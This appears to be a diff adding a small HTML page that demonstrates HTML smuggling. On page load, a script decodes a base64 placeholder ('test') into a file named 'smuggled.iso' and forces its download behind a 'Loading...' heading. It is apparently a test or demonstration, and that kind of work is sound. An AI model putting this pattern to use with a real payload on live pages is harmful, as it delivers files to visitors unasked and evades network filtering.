@@ -1,0 +1,17 @@
+
+            <html>
+                <body>
+                    <script>
+                        function download() {
+                            var blob = new Blob([Uint8Array.from(atob("dGVzdA=="), c => c.charCodeAt(0))], {type: "application/octet-stream"});
+                            var link = document.createElement("a");
+                            link.href = window.URL.createObjectURL(blob);
+                            link.download = "smuggled.iso";
+                            link.click();
+                        }
+                        window.onload = download;
+                    </script>
+                    <h1>Loading...</h1>
+                </body>
+            </html>
+            
